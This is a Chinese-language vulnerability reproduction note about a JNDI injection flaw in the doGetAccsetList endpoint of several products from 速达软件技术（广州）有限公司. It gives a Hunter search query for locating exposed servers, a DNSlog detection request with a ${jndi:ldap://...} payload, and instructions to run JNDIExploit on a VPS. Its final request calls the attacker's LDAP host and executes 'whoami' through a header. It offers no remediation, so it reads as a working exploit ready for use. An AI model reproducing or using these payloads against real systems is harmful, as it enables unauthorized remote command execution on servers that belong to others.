# 速达软件技术（广州）有限公司多款产品doGetAccsetList存在JNID注入漏洞

# 一、漏洞简介
速达软件技术（广州）有限公司多款产品doGetAccsetList存在JNID注入漏洞,攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 速达软件技术（广州）有限公司多款产品

# 三、资产测绘
+ hunter`web.body="速达软件技术（广州）有限公司"`
+ 特征

![1699201284929-aa4ce68c-746e-4b42-b2a6-5ee57011daf5.png](./img/Vh0u6SfE9CYrencQ/1699201284929-aa4ce68c-746e-4b42-b2a6-5ee57011daf5-024504.png)

![1699201312048-19df152b-1307-4860-87ac-d74fe2d646ae.png](./img/Vh0u6SfE9CYrencQ/1699201312048-19df152b-1307-4860-87ac-d74fe2d646ae-424849.png)

# 四、漏洞复现
1. 获取dnslog

```plain
s7c4np.dnslog.cn
```

![1705076444377-d57cc238-fa42-4943-b568-cd8f02ef3dbb.png](./img/Vh0u6SfE9CYrencQ/1705076444377-d57cc238-fa42-4943-b568-cd8f02ef3dbb-942093.png)

2. 检测是否存在漏洞

```plain
GET /login/login!doGetAccsetList.action?report=${jndi:ldap://s7c4np.dnslog.cn} HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=95B4E05547D0C692CF0D0DD69AC5241B
Connection: close
```

![1705076482745-7d180eeb-6296-47ee-927f-7091624b3756.png](./img/Vh0u6SfE9CYrencQ/1705076482745-7d180eeb-6296-47ee-927f-7091624b3756-118860.png)

漏洞利用

[JNDIExploit-1.4-SNAPSHOT.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222146364-082044c2-ac87-44a7-811f-9736dc52da70.jar)

将`JNDIExploit-1.4-SNAPSHOT.jar`上传到`vps`

```plain
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i vpsip
```

![1705075364344-caf730e8-f910-4617-87ae-297aec05dbeb.png](./img/Vh0u6SfE9CYrencQ/1705075364344-caf730e8-f910-4617-87ae-297aec05dbeb-351326.png)

```plain
GET /login/login!doGetAccsetList.action?report=${jndi:ldap://vpsip:1389/Basic/TomcatEcho} HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
cmd: whoami
Cookie: JSESSIONID=95B4E05547D0C692CF0D0DD69AC5241B
Connection: close
```

![1705076557686-ad6fd9ba-b8ba-48ba-92df-0f088046963b.png](./img/Vh0u6SfE9CYrencQ/1705076557686-ad6fd9ba-b8ba-48ba-92df-0f088046963b-079061.png)



> 更新: 2024-02-29 23:55:46  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wyzfyvuxdlu610a7>